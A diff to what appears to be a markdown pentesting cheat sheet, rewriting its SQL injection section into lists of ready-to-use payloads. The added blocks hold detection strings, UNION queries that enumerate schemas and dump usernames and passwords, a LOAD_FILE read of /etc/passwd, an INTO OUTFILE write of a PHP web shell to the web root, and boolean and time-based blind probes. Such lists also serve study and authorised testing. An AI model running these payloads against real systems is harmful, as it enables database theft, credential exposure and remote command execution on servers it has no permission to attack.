@@ -97,17 +97,55 @@ $(...)
 ```
 You can find payloads of Windows and linux with file uploads of this repositorie
   ### XSS (Cross Site Scripting)
-  ### SQL Injection    
-  Its time to SQLI Suuuuuuuuuuuuuuuuuu !!!!!!!!!!!  
-Before startin here some link and images useful : 
-- [Advance Payload SQLI Github](https://github.com/payloadbox/sql-injection-payload-list)
-  
-  ![](types_of_sqli.jpg)
-  
+### SQL Injection    
+Its time to SQLI Suuuuuuuuuuuuuuuuuu !!!!!!!!!!!  
+Before starting here some links and images useful : [Advance Payload SQLI Github](https://github.com/payloadbox/sql-injection-payload-list)  
+![](types_of_sqli.jpg)
+
+Each following payload is an example you need modify them before use.   
+
+**Payload detection**  
 ```SQL
-SELECT * from artcile where id = 1 ;--(e.g: SELECT column_name from table_name where filter = 1)
-SELECT * from artcile where id = '1' UNION SELECT 1,2,3 where database() like 'sq%';--
-SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
+' OR 1=1 --
+' OR 'a'='a' --
+--
+')--
+'
+"
+#
+;
+)
+```
+**Union Based Payload**  
+```SQL
+' UNION SELECT 1,2 --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION select 1,@@version,3,4-- -
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--
+' UNION select 1,database(),2,3-- -
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+' UNION select 1, username, password, 4 from dev.credentials-- -
+' UNION SELECT 1, user(), 3, 4-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+' UNION SELECT 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+' UNION SELECT "",'<?php system($_GET[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+**Boolean Based Payload**
+```SQL
+' UNION SELECT 1,2,3 where database() like 's%';--
+' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--
+' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
+```
+**Time Based**
+```SQL
+' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 ```
 
   ## *Top 4 non-secure application*
